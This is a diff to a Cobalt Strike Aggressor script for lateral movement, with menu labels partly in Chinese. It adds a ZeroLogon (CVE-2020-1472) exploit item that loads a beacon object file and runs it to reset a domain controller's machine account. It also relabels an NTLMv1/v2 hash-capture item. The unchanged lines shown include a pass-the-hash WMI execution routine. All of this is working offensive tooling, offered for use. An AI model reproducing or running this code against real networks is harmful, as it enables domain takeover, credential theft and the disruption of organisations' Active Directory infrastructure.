@@ -60,7 +60,7 @@ menu "横向移动" {
 			dbutton_action($dialog,"Exploit");
 			dialog_show($dialog);
 		}
-		item "NTLM hash"{
+		item "GetNetNtlm v1/v2 Hash"{
     		local('$bid');
                foreach $bid ($1){
                    internal_monologue($bid);
@@ -162,8 +162,36 @@ sub sharpwmi_run{
 			dialog_show($dialog);
 		}
 	}
+	separator();
+	item "ZeroLogon" {
+				$dialog = dialog("ZeroLogon", %( bid => $1["@"] , Domain => "Mikasa.com" , NetBios => "DomainAD" , arch => "x64") ,&ZeroLogon);
+				dialog_description($dialog,"ZeroLogon的Bof实现,参考https://github.com/rsmudge/ZeroLogon-BOF，若失败请尝试让Beacon为x64");
+				drow_text($dialog,"Domain","域名:");
+				drow_text($dialog,"NetBios","域控NetBios:");
+				drow_combobox($dialog,"arch","Arch:",@("x64","x86"));
+				dbutton_action($dialog,"Exploit");
+				dialog_show($dialog);
+	}
 }
 
+sub ZeroLogon{
+	$arch = $3["arch"];
+	$bid = $3["bid"];
+	$fqdn = $3["NetBios"] . "." . $3["Domain"];
+
+	#read in the right BOF file
+	$handle = openf(script_resource("./modules/LateralMove/ZeroLogon/zerologon. $+ $arch $+ .o"));
+	$data = readb($handle,-1);
+	closef($handle);
+
+	# build our arguments
+	$args = bof_pack($bid,"ZZZ",$fqdn,$3["NetBios"],$3["NetBios"] . '$');
+
+	btask($bid, "Reset  Domain via CVE-2020-1472");
+
+	# execute it.
+	beacon_inline_execute($bid, $data, "go", $args);
+}
 sub Wmiexec {
 	bpowershell_import($3["bid"],script_resource("./modules/LateralMove/Invoke-WMIExec.ps1"));
 	$payload = "Invoke-WMIExec -Target " . $3["IP"] . " -Domain " . $3["Domain"] . " -Username " . $3["user"] . " -Hash " . $3["hash"] . " -Command \"" . $3["command"] . "\"" . " -verbose";
